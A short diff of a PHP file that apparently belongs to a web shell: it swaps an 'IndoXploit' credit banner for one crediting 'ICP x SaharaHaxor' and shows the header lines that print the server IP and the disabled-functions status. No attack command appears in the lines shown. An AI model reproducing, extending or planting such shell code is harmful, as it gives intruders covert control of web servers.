@@ -1,10 +1,9 @@
 <tr><td>
 <center>
 <?php
-<?php
-#######################
-#Thank's to IndoXploit#
-#######################
+################################
+#Thanks To ICP x SaharaHaxor!
+################################
 error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
 $show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
 echo "<b><font color='green'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
